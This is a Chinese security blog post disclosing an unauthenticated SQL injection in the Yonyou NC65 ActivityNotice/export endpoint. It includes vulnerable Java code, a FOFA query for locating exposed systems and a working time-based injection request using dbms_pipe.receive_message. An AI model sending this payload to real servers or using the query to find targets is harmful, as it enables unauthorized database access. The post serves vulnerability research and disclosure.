---
title: "用友NC ActivityNotice/export SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html
asset_dir: assets/用友nc-activitynoticeexport-sql注入漏洞
---

# 用友NC ActivityNotice/export SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/25 08:32
* 1103浏览
* [0评论](#comment)
* 36分钟阅读

深入探索

软件

数据库管理系统

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。⽤友NC `ActivityNotice/export` 接⼝处存在[SQL注入漏洞](https://mrxn.net/tag/SQL注入)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

SQL注入检测工具

# 影响版本

NC65

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

深入探索

授权

在线安全工具

安全认证考试

直接看 `ActivityAction` 下的 `export` 方法是如何实现的

```
@Action
    public void export() {
        try {
            LfwLogger.error("action/export打包下载was日志");
            Logger.error("action/export打包下载was日志");
            HttpServletResponse response = this.getResponse();
            response.setContentType("text/html");
            response.setCharacterEncoding("UTF-8");
            HttpServletRequest request = this.request;
            String itemid = request.getParameter("itemid");
            LfwFileVO[] vos = ActivityViewHelper.getFileIDs(itemid);
            if (vos != null && vos.length > 0) {
                OutputStream out = null;
                OutputStream var10 = response.getOutputStream();
                UFDateTime lastModify = new UFDateTime();
                response.setHeader("Last-Modified", lastModify.toString());
                response.setHeader("Content-Type", "application/zip;charset=UTF-8");
                String fileName = URLEncoder.encode(LfwResBundle.getInstance().getStrByID("signupmng", "ActivityAction-000001"), "UTF-8");
                response.setHeader("Content-Disposition", "attachment;filename=" + fileName);
                ActivityUtil.Zip(vos, var10);
                response.flushBuffer();
                IOUtils.closeQuietly(var10);
            }
        } catch (IOException e) {
            LfwLogger.error("action/export" + e.getMessage());
            Logger.error("action/export" + e.getMessage());
            Logger.error(e.getMessage(), e);
        } catch (Exception e) {
            LfwLogger.error("action/export" + e.getMessage());
            Logger.error("action/export" + e.getMessage());
            Logger.error(e.getMessage(), e);
        }

    }
```

深入探索

文件大小转换

网页浏览器

Docker加速服务

用户可控参数 `itemid` 带入 `ActivityViewHelper.getFileIDs` 方法中，其实现如

代码安全审计

```
public static LfwFileVO[] getFileIDs(String itemID) {
        if (null == itemID) {
            return null;
        } else {
            try {
                LfwFileVO[] lfwfileVos = FileManager.getSystemFileManager("bafile").getFileByItemID(itemID);
                return lfwfileVos != null ? lfwfileVos : null;
            } catch (LfwBusinessException e) {
                throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("signupmng", "ActivityViewHelper-000014"), e);
            }
        }
    }
```

可以看见其又被带入 `getSystemFileManager` 的 `getFileByItemID` 方法里

```
public LfwFileVO[] getFile(String billtype, String billitem) throws LfwBusinessException {
        BaseDAO dao = new BaseDAO();

        try {
            StringBuffer sb = new StringBuffer();
            new LfwFileVO();
            if (StringUtils.isNotBlank(billitem)) {
                sb.append(" pk_billitem = '").append(billitem).append("' ");
                sb.append(" order by lastmodifytime desc ");
                List<? extends SuperVO> l = (List)dao.retrieveByClause(LfwFileVO.class, sb.toString());
                return l.isEmpty() ? null : (LfwFileVO[])((LfwFileVO[])l.toArray(new LfwFileVO[0]));
```

到这里就比较明了，最终这个参数 `itemid` 是未经过任何过滤或校验就被直接拼接到sql语句中进行执行从而造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

# 漏洞复现

```
POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: nc65.mrxn.net

itemid=1' AND 1=dbms_pipe.receive_message('RDS', 6)--
```

[![用友NC ActivityNotice/export SQL注入漏洞](images/img-001-5c89971ccc2f.webp)](https://image.mrxn.net/8005184003a547a89bc2c34d9d2d7d17.webp)

成功延时 6 秒

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC ActivityNotice/export SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

企业资源规划

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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